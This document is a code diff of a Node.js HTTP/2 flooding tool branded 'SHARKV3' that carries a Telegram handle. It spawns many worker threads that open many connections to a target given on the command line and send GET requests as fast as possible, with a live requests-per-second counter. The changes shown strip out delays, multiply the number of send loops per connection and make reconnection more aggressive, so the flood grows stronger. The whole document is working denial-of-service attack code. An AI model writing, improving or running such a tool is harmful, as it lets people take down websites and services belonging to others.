@@ -4,9 +4,6 @@ const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
 
-process.on('uncaughtException', () => {});
-process.on('unhandledRejection', () => {});
-
 const THREADS = 32;
 const INITIAL_CONNECTIONS = 45;
 const POWER_MULTIPLIER = 4;
@@ -18,8 +15,6 @@ let successCount = 0;
 let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
-
-const LOCAL_PORT = Math.floor(10000 + Math.random() * 50000);
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -33,20 +28,17 @@ if (isMainThread) {
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
     console.log(`SHARKV3! - NO CPU WARMUP .exx`);
-    console.log(`PORT: ${LOCAL_PORT}`);
 
+    
     for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, {
-            workerData: { target, duration, initial: true, port: LOCAL_PORT }
-        });
+        new Worker(__filename, { workerData: { target, duration, initial: true } });
     }
 
     for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        new Worker(__filename, {
-            workerData: { target, duration, initial: false, port: LOCAL_PORT }
-        });
+        new Worker(__filename, { workerData: { target, duration, initial: false } });
     }
 
+    // Live Stats
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
@@ -73,23 +65,19 @@ if (isMainThread) {
             else if (msg === 'err') errorCount++;
         });
     });
-    server.listen(LOCAL_PORT);
+    server.listen(9999);
 } else {
-    const { target, duration, initial, port } = workerData;
+    const { target, duration, initial } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
 
-    const socket = net.connect(port, '127.0.0.1');
-    const sendStat = msg => {
-        try {
-            socket.write(msg);
-        } catch {}
-    };
+    const socket = net.connect(9999, '127.0.0.1');
+    const sendStat = msg => socket.write(msg);
 
     function sendLoop(client, inflight) {
         if (Date.now() > end || client.destroyed) return;
 
-        while (inflight.count < MAX_INFLIGHT) {
+        if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
                 const req = client.request({ ':method': 'GET', ':path': '/' });
@@ -112,44 +100,35 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 5);
+        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
     }
 
     function createConnection() {
         if (Date.now() > end) return;
 
+        let client;
         try {
-            const client = http2.connect(target, {
-                settings: {
-                    enablePush: false,
-                    maxConcurrentStreams: 1000,
-                }
-            });
+            client = http2.connect(target);
 
             const inflight = { count: 0 };
 
             client.on('error', () => {
-                try { client.destroy(); } catch {}
-                setTimeout(createConnection, 100);
+                client.destroy();
+                setTimeout(createConnection, 1000); // auto-recover fast
             });
 
-            client.on('goaway', () => {
-                try { client.close(); } catch {}
-            });
-
-            client.on('close', () => setTimeout(createConnection, 100));
+            client.on('goaway', () => client.close());
+            client.on('close', () => setTimeout(createConnection, 500));
 
             client.on('connect', () => {
-                for (let i = 0; i < 120; i++) {
-                    setTimeout(() => sendLoop(client, inflight), i * 5);
-                }
+                for (let i = 0; i < 1500; i++) sendLoop(client, inflight); // boosted request flow
             });
         } catch {
-            setTimeout(createConnection, 200);
+            setTimeout(createConnection, 100);
         }
     }
 
     for (let i = 0; i < connections; i++) {
-        setTimeout(createConnection, i * 10);
+        createConnection();
     }
 }
